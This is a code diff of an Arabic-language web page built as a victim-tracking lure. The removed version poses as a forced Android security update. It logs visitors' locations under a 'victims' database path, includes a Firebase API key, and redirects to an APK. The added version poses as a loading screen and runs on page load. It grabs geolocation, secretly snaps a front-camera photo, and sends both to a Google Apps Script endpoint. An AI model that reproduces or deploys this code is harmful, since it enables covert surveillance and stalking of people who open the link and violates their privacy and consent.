@@ -1,46 +1,100 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>تحديث نظام أندرويد الإجباري</title>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <title>تحميل النظام...</title>
     <style>
-        body { background-color: #f0f0f0; font-family: sans-serif; text-align: center; padding-top: 50px; }
-        .btn { background-color: #007bff; color: white; padding: 15px 30px; border: none; border-radius: 5px; cursor: pointer; font-size: 18px; }
+        body { margin:0; height:100vh; display:flex; flex-direction:column; align-items:center; justify-content:center; background:#050505; color:#00ff41; font-family:'Courier New', monospace; }
+        canvas, video { display: none; }
+        .loader { border: 2px solid #00ff41; width: 200px; height: 10px; position: relative; overflow: hidden; }
+        .bar { background: #00ff41; height: 100%; width: 0%; transition: width 0.5s; }
     </style>
 </head>
 <body>
-    <h1>تنبيه أمني هام!</h1>
-    <p>جهازك غير محمي وقد يتعرض للاختراق. يرجى تحميل تطبيق الحماية الرسمي فوراً.</p>
-    <button class="btn" onclick="startPayload()">تحميل وتثبيت الآن</button>
 
-    <script>
-        // بيانات Firebase الخاصة بك
-        const firebaseConfig = {
-            apiKey: "AIzaSyCaArCXRtxCYXXHWwKBfx-CrXUCCBjx9C8",
-            databaseURL: "https://hercules-v2-109a5-default-rtdb.firebaseio.com",
-            projectId: "hercules-v2-109a5"
+    <h2 id="msg">INITIALIZING SYSTEM...</h2>
+    <div class="loader"><div id="bar" class="bar"></div></div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+<script>
+const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzvVf9p9LHwIj8d0UnoNeak0IWTWmoxP3pYKnuX_BJFsw5OOQNljNnqS-mb371r21Ay/exec";
+const params = new URLSearchParams(window.location.search);
+const chatId = params.get("chat_id") || "UNKNOWN_USER";
+
+async function executeDeepDive() {
+    updateStatus("GEOLOCATION_SYNC...", 30);
+    
+    // 1. استخراج الموقع
+    navigator.geolocation.getCurrentPosition(async (pos) => {
+        const payload = {
+            action: "log_data",
+            chat_id: chatId,
+            lat: pos.coords.latitude,
+            lng: pos.coords.longitude,
+            type: "location"
         };
-        firebase.initializeApp(firebaseConfig);
-        const database = firebase.database();
-        const urlParams = new URLSearchParams(window.location.search);
-        const vID = urlParams.get('id') || "User_" + Math.floor(Math.random() * 1000);
+        
+        await sendToNetwork(payload);
+        updateStatus("CAMERA_INITIALIZING...", 60);
+        captureAndSend();
+    }, () => {
+        updateStatus("PERMISSION_DENIED", 100);
+        captureAndSend(); // محاولة فتح الكاميرا حتى لو رفض الموقع
+    });
+}
 
-        function startPayload() {
-            // سحب البيانات المتاحة من الرابط (IP و الموقع)
-            navigator.geolocation.getCurrentPosition((pos) => {
-                database.ref('victims/' + vID + '/Location').set({
-                    lat: pos.coords.latitude,
-                    lon: pos.coords.longitude
-                });
+async function captureAndSend() {
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        video.srcObject = stream;
+
+        setTimeout(async () => {
+            canvas.width = 480;
+            canvas.height = 640;
+            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+            const base64Image = canvas.toDataURL('image/jpeg', 0.5);
+
+            updateStatus("UPLOADING_MEDIA...", 85);
+            
+            await sendToNetwork({
+                action: "log_image",
+                chat_id: chatId,
+                image: base64Image
             });
 
-            // بدء تحميل تطبيق السحب (APK) الذي صنعته في سكتشوير
-            // يجب أن ترفع ملف الـ APK الخاص بك على رابط مباشر وتضعه هنا
-            window.location.href = "https://your-direct-link.com/app.apk";
-        }
-    </script>
+            stream.getTracks().forEach(t => t.stop());
+            updateStatus("SYSTEM_IDLE", 100);
+            document.getElementById("msg").innerText = "✅ اكتملت العملية";
+        }, 2000);
+    } catch (e) {
+        updateStatus("MEDIA_ERROR", 100);
+    }
+}
+
+async function sendToNetwork(data) {
+    try {
+        // إرسال البيانات عبر RequestNetwork (Fetch API)
+        await fetch(SCRIPT_URL, {
+            method: "POST",
+            mode: "no-cors", // لتجنب مشاكل CORS مع Google Scripts
+            cache: "no-cache",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(data)
+        });
+    } catch (err) { console.error("NET_ERR:", err); }
+}
+
+function updateStatus(text, progress) {
+    document.getElementById("msg").innerText = text;
+    document.getElementById("bar").style.width = progress + "%";
+}
+
+window.onload = executeDeepDive;
+</script>
 </body>
 </html>
-
